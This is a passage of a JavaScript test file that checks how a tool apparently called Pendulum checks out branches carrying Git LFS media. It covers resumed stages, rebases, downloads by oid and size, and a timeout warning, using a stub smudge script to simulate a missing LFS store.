 * unless told to skip the smudge. `media` puts an LFS file into origin: its object in origin's store, its pointer
 * committed on `branch` by someone else. Returns {real, media}.
 */
async function lfsCheckout(r) {
  const real = !!(await lfsVersion());
  r.put(r.other, ".gitattributes", "assets/** filter=lfs diff=lfs merge=lfs -text\n");
  r.run(r.other, "commit", "-q", "-m", "lfs");
  r.run(r.other, "push", "-q", "origin", "HEAD:main");
  if (real) {
    const box = await open(r);
    await box.feed();
    assert.deepEqual(await box.putOn("refs/remotes/origin/main"), { code: 0, error: "" });
    assert.equal((await box.lfsSetup(box.base)).used, true);
    r.run(r.work, "config", "lfs.url", `file://${join(r.root, "no-lfs-storage")}`);
  } else {
    const fake = join(r.root, "fake-lfs-smudge");
    writeFileSync(fake, `#!/bin/sh\nif [ "$GIT_LFS_SKIP_SMUDGE" = 1 ]; then exec cat; fi\necho "fatal: could not read Username for 'https://github.com': terminal prompts disabled" >&2\nexit 1\n`, { mode: 0o755 });
    r.run(r.work, "config", "filter.lfs.smudge", fake);
    r.run(r.work, "config", "filter.lfs.clean", "cat");
    r.run(r.work, "config", "filter.lfs.required", "true");
  }
  const media = (branch, file) => {
    const bytes = randomBytes(3000);
    const oid = createHash("sha256").update(bytes).digest("hex");
    const store = join(r.origin, "lfs", "objects", oid.slice(0, 2), oid.slice(2, 4));
    mkdirSync(store, { recursive: true });
    writeFileSync(join(store, oid), bytes);
    r.run(r.other, "fetch", "-q", "origin");
    r.run(r.other, "checkout", "-q", "-B", branch, `origin/${branch}`);
    r.put(r.other, file, `${POINTER_HEAD}\noid sha256:${oid}\nsize 3000\n`);
    r.run(r.other, "commit", "-q", "--no-verify", "-m", `media ${file}`);
    r.run(r.other, "push", "-q", "origin", `HEAD:${branch}`);
    return bytes;
  };
  return { real, media };
}

test("outbox: a resumed checkout with Git LFS filters is put on a branch that gained media it lacks; the media arrives by the hand-over (#73)", async () => {
  const r = repos();
  const { real, media } = await lfsCheckout(r);
  // The first stage: the branch from main, one commit, pushed.
  const box1 = await open(r);
  await box1.feed();
  assert.deepEqual(await box1.putOn("refs/remotes/origin/main"), { code: 0, error: "" });
  r.put(r.work, "app.txt", "v2\n");
  r.run(r.work, "commit", "-q", "-m", "work");
  assert.equal(await box1.push(), true, box1.error);
  // Meanwhile the branch gains media whose object the checkout's store lacks.
  const bytes = media("pendulum/1", "assets/a.bin");
  const head = r.run(r.other, "rev-parse", "HEAD");
  // The resumed run: Pendulum's checkout leaves a pointer file and asks LFS storage for nothing.
  const box2 = await open(r);
  await box2.feed();
  assert.deepEqual(await box2.putOn("refs/remotes/origin/pendulum/1"), { code: 0, error: "" });
  assert.equal(r.run(r.work, "rev-parse", "HEAD"), head);
  assert.match(readFileSync(join(r.work, "assets/a.bin"), "utf8"), /^version https:\/\/git-lfs\.github\.com\/spec\/v1\n/);
  if (!real) return;
  // Then the hand-over: the object from Pendulum's mirror, the real file in the checkout, nothing shown as changed.
  assert.deepEqual(await box2.lfsSetup(box2.expected()), { used: true, ok: true, reason: "", warning: "" });
  assert.deepEqual(readFileSync(join(r.work, "assets/a.bin")), bytes);
  assert.equal(r.run(r.work, "status", "--porcelain", "--untracked-files=no"), "");
});

const inStore = (r, bytes) => {
  const oid = createHash("sha256").update(bytes).digest("hex");
  try {
    return readFileSync(join(r.work, ".git", "lfs", "objects", oid.slice(0, 2), oid.slice(2, 4), oid)).equals(bytes);
  } catch {
    return false;
  }
};

/** The first stage on pendulum/1: the branch from main, one commit of app.txt, pushed. */
async function firstStage(r) {
  const box = await open(r);
  await box.feed();
  assert.deepEqual(await box.putOn("refs/remotes/origin/main"), { code: 0, error: "" });
  r.put(r.work, "app.txt", "branch\n");
  r.run(r.work, "commit", "-q", "-m", "work");
  assert.equal(await box.push(), true, box.error);
}

test("outbox: rebase mode puts the checkout on Pendulum's rebase with the default branch's new media (#76)", async (t) => {
  if (!(await lfsVersion())) return t.skip("git-lfs is not installed");
  const r = repos();
  const { media } = await lfsCheckout(r);
  await firstStage(r);
  // The resumed stage starts, then the default branch gains media (a sibling merged) and Pendulum rebases onto it.
  const box = await open(r);
  await box.feed();
  assert.deepEqual(await box.putOn("refs/remotes/origin/pendulum/1"), { code: 0, error: "" });
  assert.equal((await box.lfsSetup(box.expected())).warning, "");
  const bytes = media("main", "assets/b.bin");
  await box.refresh();
  const sha = await box.rebase({ name: "pendulum", email: "f@f" });
  assert.equal(await box.push({ sha }), true, box.error);
  const on = await box.putOnRebased(sha);
  assert.deepEqual(on, { code: 0, error: "", warning: "" });
  assert.equal(r.run(r.work, "rev-parse", "HEAD"), sha);
  assert.deepEqual(readFileSync(join(r.work, "assets/b.bin")), bytes);
  assert.equal(r.run(r.work, "status", "--porcelain", "--untracked-files=no"), "");
});

test("outbox: the hand-over downloads only what the checkout's store lacks by oid and size, and says when time cut git lfs checkout (#79)", async (t) => {
  if (!(await lfsVersion())) return t.skip("git-lfs is not installed");
  const r = repos();
  const { media } = await lfsCheckout(r);
  await firstStage(r);
  const a = media("pendulum/1", "assets/a.bin");
  const b = media("pendulum/1", "assets/b.bin");
  const stage = async (extra = {}) => {
    const box = await open(r, extra);
    await box.feed();
    assert.deepEqual(await box.putOn("refs/remotes/origin/pendulum/1"), { code: 0, error: "" });
    return box;
  };
  const box1 = await stage();
  assert.equal((await box1.lfsSetup(box1.expected())).warning, "");
  assert.ok(inStore(r, a) && inStore(r, b));
  // The next stage in the same clone. a.bin's object is gone from LFS storage: a stage that downloaded it again would
  // fail. The branch gains c.bin, whose oid the checkout's store holds with the wrong size: it is downloaded and
  // replaced, not taken by its name.
  const oid = (bytes) => createHash("sha256").update(bytes).digest("hex");
  rmSync(join(r.origin, "lfs", "objects", oid(a).slice(0, 2), oid(a).slice(2, 4), oid(a)));
  const c = media("pendulum/1", "assets/c.bin");
  mkdirSync(join(r.work, ".git", "lfs", "objects", oid(c).slice(0, 2), oid(c).slice(2, 4)), { recursive: true });
  writeFileSync(join(r.work, ".git", "lfs", "objects", oid(c).slice(0, 2), oid(c).slice(2, 4), oid(c)), c.subarray(0, 100));
  const box2 = await stage();
  assert.deepEqual(await box2.lfsSetup(box2.expected()), { used: true, ok: true, reason: "", warning: "" });
  assert.ok(inStore(r, a) && inStore(r, b) && inStore(r, c));
  for (const [f, bytes] of [["a", a], ["b", b], ["c", c]]) assert.deepEqual(readFileSync(join(r.work, `assets/${f}.bin`)), bytes);
  // Time runs out before git lfs checkout: said, not skipped silently.
  assert.match((await box2.lfsHandOver(box2.expected(), { timeoutMs: 1 })).warning, /no time was left in the stage for git lfs checkout; the files stay pointers$/);
});
